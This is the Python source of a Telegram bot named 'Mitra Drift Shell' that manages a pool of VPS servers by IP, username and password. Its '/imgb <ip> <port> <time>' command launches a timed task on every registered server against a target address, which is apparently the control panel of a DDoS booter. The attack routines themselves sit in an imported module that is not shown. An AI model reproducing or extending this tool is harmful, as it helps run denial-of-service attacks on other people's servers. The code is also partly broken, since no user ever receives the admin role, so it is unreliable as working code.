import telebot, json, os
from vps_handler import add_vps, remove_vps, run_task, get_vps_status

TOKEN = "YOUR_BOT_TOKEN"
bot = telebot.TeleBot(TOKEN)

# Auto load / create files
def load_json(path, default):
    if not os.path.exists(path):
        with open(path, "w") as f:
            json.dump(default, f)
    with open(path) as f:
        return json.load(f)

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f)

config = load_json("config.json", {"admins": []})
ADMINS = config["admins"]
SESSION = load_json("approved.json", {})

# START command
@bot.message_handler(commands=["start"])
def start_cmd(msg):
    uid = str(msg.from_user.id)
    if uid in SESSION:
        return send_welcome(msg, SESSION[uid])
    for admin in ADMINS:
        bot.send_message(admin, f"🆕 Access request: {msg.from_user.first_name} ({uid})\n✅ /approve {uid}\n❌ /deny {uid}")
    bot.reply_to(msg, "⏳ Waiting for admin approval...")

def send_welcome(msg, role):
    text = f"""
👋 Welcome to Mitra Drift Shell

Role: {'🛡️ ADMIN' if role == 'admin' else '🟢 MEMBER'}

📘 Commands:
/imgb <ip> <port> <time>
/status
{"/addvps <ip> <user> <pass>\n/removevps <ip>\n/approve <id>\n/deny <id>" if role == "admin" else ""}
"""
    bot.reply_to(msg, text)

# APPROVE
@bot.message_handler(commands=["approve"])
def approve(msg):
    if str(msg.from_user.id) not in ADMINS:
        return
    try:
        uid = msg.text.split()[1]
        SESSION[uid] = "member"
        save_json("approved.json", SESSION)
        bot.send_message(uid, "✅ Access Approved. Use /help to begin.")
        bot.reply_to(msg, f"✅ Approved {uid}")
    except:
        bot.reply_to(msg, "Usage: /approve <user_id>")

# DENY
@bot.message_handler(commands=["deny"])
def deny(msg):
    if str(msg.from_user.id) not in ADMINS:
        return
    try:
        uid = msg.text.split()[1]
        bot.send_message(uid, "❌ Access denied by admin.")
        bot.reply_to(msg, f"Denied {uid}")
    except:
        bot.reply_to(msg, "Usage: /deny <user_id>")

# HELP
@bot.message_handler(commands=["help"])
def help_cmd(msg):
    uid = str(msg.from_user.id)
    role = SESSION.get(uid)
    if not role:
        return bot.reply_to(msg, "Please wait for approval.")
    cmds = ["/imgb <ip> <port> <time>", "/status"]
    if role == "admin":
        cmds += ["/addvps <ip> <user> <pass>", "/removevps <ip>", "/approve <id>", "/deny <id>"]
    bot.reply_to(msg, "📘 Available Commands:\n" + "\n".join(cmds))

# ADD VPS
@bot.message_handler(commands=["addvps"])
def addvps_cmd(msg):
    if SESSION.get(str(msg.from_user.id)) != "admin":
        return
    args = msg.text.split()
    if len(args) != 4:
        return bot.reply_to(msg, "Usage: /addvps <ip> <user> <pass>")
    ip, user, pw = args[1:]
    add_vps(ip, user, pw)
    bot.reply_to(msg, f"✅ VPS {ip} added.")

# REMOVE VPS
@bot.message_handler(commands=["removevps"])
def removevps_cmd(msg):
    if SESSION.get(str(msg.from_user.id)) != "admin":
        return
    args = msg.text.split()
    if len(args) != 2:
        return bot.reply_to(msg, "Usage: /removevps <ip>")
    remove_vps(args[1])
    bot.reply_to(msg, f"🗑️ VPS {args[1]} removed.")

# STATUS
@bot.message_handler(commands=["status"])
def status_cmd(msg):
    if str(msg.from_user.id) not in SESSION:
        return
    bot.reply_to(msg, get_vps_status())

# IMGB
@bot.message_handler(commands=["imgb"])
def imgb_cmd(msg):
    if str(msg.from_user.id) not in SESSION:
        return
    args = msg.text.split()
    if len(args) != 4:
        return bot.reply_to(msg, "Usage: /imgb <ip> <port> <duration>")
    ip, port, dur = args[1:]
    count = run_task(ip, port, dur)
    bot.reply_to(msg, f"🚀 Task started on {count} VPS.")

# Run Bot
print("🤖 Mitra Drift Bot is running...")
bot.infinity_polling(timeout=60, long_polling_timeout=30)
